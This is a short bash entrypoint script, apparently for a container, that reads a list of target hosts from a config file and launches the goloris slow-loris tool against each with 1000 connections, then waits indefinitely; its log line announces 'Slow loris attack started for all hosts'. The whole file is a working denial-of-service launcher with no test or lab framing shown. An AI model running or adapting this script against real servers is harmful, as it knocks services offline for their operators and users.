#!//bin/bash

CONF_FILE=/etc/doloris.conf
CONNECTIONS=1000

function main() {
    for record in `cat ${CONF_FILE}`; do
        echo "[INFO] - Running goloris for: ${record}"
        TARGET_HOST=`echo $record | cut -d',' -f1`
        TARGET_SCHEME=`echo $record | cut -d',' -f2`

        extra_opts=''
        if [[ ${TARGET_SCHEME} == 'https' ]]; then
            extra_opts='-https'
        fi
        set -x
        goloris $extra_opts -connections=${CONNECTIONS} ${TARGET_HOST} > /dev/null 2>&1 &
        set +x
    done

    echo "[INFO] - Slow loris attack started for all hosts, waiting..."
    while true
    do
        sleep 3600
    done
}

if [[ $# == '0' ]]; then
    echo "[INFO] - Running default command"
    main
else
    echo "[INFO] - Running $@"
    exec $@
fi
